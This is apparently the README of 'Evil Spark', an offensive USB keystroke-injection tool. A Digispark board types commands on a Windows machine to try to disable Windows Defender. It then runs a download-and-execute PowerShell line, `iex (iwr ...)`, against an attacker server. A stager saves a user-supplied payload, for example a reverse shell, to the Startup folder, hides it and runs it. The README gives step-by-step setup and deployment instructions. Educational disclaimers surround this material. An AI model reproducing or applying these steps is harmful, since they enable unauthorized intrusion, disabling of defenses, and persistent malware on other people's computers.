#Evil Spark 
![Evil Spark](https://github.com/MustafaCyb/Evil-Spark/blob/main/EvilSpark.png)
---

**⚠️ DANGER: EXTREME WARNING ⚠️**
This project is developed for **educational and research purposes ONLY**. Unauthorized use of this tool on any system or network without explicit, prior, mutual, and written consent is **ILLEGAL** and **STRICTLY PROHIBITED**. The creators and contributors of Evil Spark assume **NO LIABILITY** and are **NOT RESPONSIBLE** for any misuse, damage, or legal consequences arising from the use or handling of this software. **USE AT YOUR OWN EXTREMIA PERIL AND RESPONSIBILITY.**

---

## 🚀 Project Overview
Evil Spark demonstrates a proof-of-concept (PoC) attack chain utilizing a Digispark-compatible USB device. This device emulates keyboard actions to automate tasks on a target Windows machine, leading to the download and execution of a custom payload with persistence. This project integrates:
* A Linux-based server setup script (`setup.sh`).
* A Digispark sketch (`Evil_Spark.ino`) written in C++. 
* A PowerShell script (`Starter.ps1`) for payload deployment and execution. 

This project is designed to help understand HID attacks, payload delivery mechanisms, and basic persistence techniques from a defensive perspective.

## 🔥 Key Features
* ✔️ Automated Keystroke Injection via Digispark (HID Attack).
* ✔️ Apache Server Setup Script (`setup.sh`) for hosting payloads.
* ✔️ PowerShell-based payload stager (`Starter.ps1`) for:
    * Attempting to disable Windows Defender. 
    * Downloading the main payload. 
    * Executing the payload. 
    * Achieving persistence via the Startup folder. 

## 🔗 Workflow At a Glance
![Workflow At a Glance](https://github.com/MustafaCyb/Evil-Spark/blob/main/Diagram.png)
1.  **💻 Attacker Setup:**
    * The `setup.sh` script configures an Apache server on Linux to host `Starter.ps1` and the `payload.exe`.
    * The `Evil_Spark.ino` (C++ sketch) ; is customized with the server's IP and uploaded to the Digispark device using the Arduino IDE.
2.  **🔌 Deployment:**
    * The programmed Evil Spark USB is plugged into the target Windows computer.
3.  **🤖 Automated Execution (Digispark):**
    * The Digispark emulates keyboard inputs. 
    * It attempts to disable Windows Defender through UI manipulation. 
    * It opens PowerShell (with attempted admin rights)  and commands it to download and execute `Starter.ps1` from the attacker's server. 
4.  **🎯 Payload Delivery & Persistence (`Starter.ps1`):**
    * `Starter.ps1` runs on the target machine. 
    * Downloads the main `payload.exe` (e.g., `ring.exe` as in the example script).
    * Saves the payload to the Windows Startup folder for persistence. 
    * Hides the payload file. 
    * Executes the payload. 

## ⚙️ Project Components

### 1. `setup.sh` (Bash Script)
* Automates Apache2 web server setup on Debian-based Linux.
* Updates packages, installs Apache2, and starts the service.
* Creates `/var/www/html/tools` for hosting files. [cite: 3]
* Moves `payload.exe` (or your chosen name) and `Starter.ps1` to the tools directory. [cite: 3]

### 2. `Evil_Spark.ino` (Digispark C++ Sketch)
* Arduino C++ code for ATtiny85 based Digispark-compatible devices. 
* Simulates keyboard inputs to perform the automated attack steps. 
* **Requires Arduino IDE for compilation and upload.** (Download from: [https://www.arduino.cc/en/software/](https://www.arduino.cc/en/software/))

### 3. `Starter.ps1` (PowerShell Script)
* PowerShell script executed on the target. 
* Attempts `Set-MpPreference -DisableRealtimeMonitoring $true`. 
* Downloads the main payload (e.g., `ring.exe`) to the Startup folder. 
* Hides the payload using `attrib +h +s`. 
* Executes the payload. 

### 4. `payload.exe` (Example: `ring.exe`)
* **THIS IS THE CORE PAYLOAD YOU MUST CREATE OR PROVIDE.**
* This project *does not* include a pre-made `payload.exe`.
* Functionality is user-defined (e.g., reverse shell, information gathering, etc.).
* **Payload Inspiration & Reference:** For creating a custom payload, particularly one in Go (which compiles to an `.exe`), you can study projects like **RingShell**. RingShell is a Go-based C2 framework and can serve as an excellent reference for understanding how such payloads are structured and deployed.
    * RingShell GitHub Repository: [https://github.com/MustafaAbdulazizHamza/RingShell/tree/main](https://github.com/MustafaAbdulazizHamza/RingShell/tree/main)

## 🛠️ Prerequisites & Tools
* 🐧 A Linux machine (Debian-based recommended for `setup.sh`) for the server.
* 🔌 Digispark ATtiny85 compatible USB board.
* 💻 **Arduino IDE:** Used to compile the C++ sketch (`.ino`) and upload it to the Digispark. 
    * Download: [https://www.arduino.cc/en/software/](https://www.arduino.cc/en/software/)
* 🎯 A Windows target machine for testing (**WITH EXPLICIT, PRIOR, WRITTEN CONSENT ONLY**).
* 👾 Your custom `payload.exe` (e.g., `ring.exe`).

## 🚀 Setup & Deployment Guide

### 1.  SERVER: Apache Setup (`setup.sh`)
1.  Place `setup.sh`, your `payload.exe` (e.g., `ring.exe`), and `Starter.ps1` in the same directory on your Linux server.
2.  Edit `setup.sh`:
    * Set `PAYLOAD="your_payload_name.exe"` (e.g., `PAYLOAD="ring.exe"`). [cite: 3]
    * Ensure `SHELL_SCRIPT="Starter.ps1"`. [cite: 3]
3.  Make `setup.sh` executable: `chmod +x setup.sh`.
4.  Run with sudo: `sudo ./setup.sh`.
5.  Note your server's IP address (the script attempts to display it).

### 2. TARGET SCRIPT: `Starter.ps1` Configuration
1.  Edit `Starter.ps1`.
2.  Update the URI in `Invoke-WebRequest` to point to your payload on your server:
    * Example: `Invoke-WebRequest -Uri "http://<YOUR_SERVER_IP>/tools/ring.exe" -OutFile $target` 
    * Replace `<YOUR_SERVER_IP>` and ensure `ring.exe` matches your payload filename.

### 3. DIGISPARK: `Evil_Spark.ino` Programming
1.  Open `Evil_Spark.ino` (your C++ sketch for the Digispark) in the **Arduino IDE**. 
2.  Modify the line that fetches `Starter.ps1` to include your server's IP:
    * Example: `DigiKeyboard.print("iex (iwr 'http://<YOUR_SERVER_IP>/tools/Starter.ps1')");` 
3.  In Arduino IDE:
    * Ensure Digispark board drivers/support are installed.
    * Select the correct Digispark board from the Tools menu.
    * Compile and Upload the sketch to your Digispark.

### 4. 💣 DEPLOYMENT
1.  Ensure your Apache server is running and accessible.
2.  Plug the programmed Evil Spark USB into the **consenting** target Windows machine.
3.  The Digispark will emulate keystrokes and initiate the programmed sequence. 

## ❗ Important Considerations & Limitations
* **UAC (User Account Control):** The `.ino` sketch attempts to handle UAC.  Its success varies based on target system settings.
* **Antivirus (AV) & EDR:** Basic attempts to disable Windows Defender [cite: 4, 5] are included. Modern AV/EDR solutions will likely detect and block these activities. This PoC is not designed for stealth.
* **Keyboard Layouts:** Keystroke emulation typically assumes a US QWERTY layout. Results may vary on different layouts.
* **Timings & Delays:** `DigiKeyboard.delay()` values in the `.ino` sketch are critical.  Adjust them based on target system responsiveness.
* **Network Connectivity:** The target PC needs HTTP (port 80) access to your server.
* **Payload Naming:** Ensure consistency in payload filenames across `setup.sh`, `Starter.ps1`, and your actual payload file.

## 📜 Ethical Conduct & Legal Disclaimer
Reiterating the initial warning: This project is **STRICTLY FOR EDUCATIONAL PURPOSES**. Understanding offensive security techniques is vital for building robust defenses. **DO NOT USE THIS TOOL OR ANY DERIVATIVE ON SYSTEMS OR NETWORKS WITHOUT EXPLICIT, WRITTEN PERMISSION.** Unauthorized system access is a serious crime.

## 📄 License
This project is shared for educational exploration. While no specific open-source license is formally attached, users are expected to adhere to the ethical guidelines and disclaimers stated herein. If you adapt or distribute this work, please maintain its educational context and include all original warnings and disclaimers.

---
*Happy (Ethical) Hacking!* 👨‍💻🔬
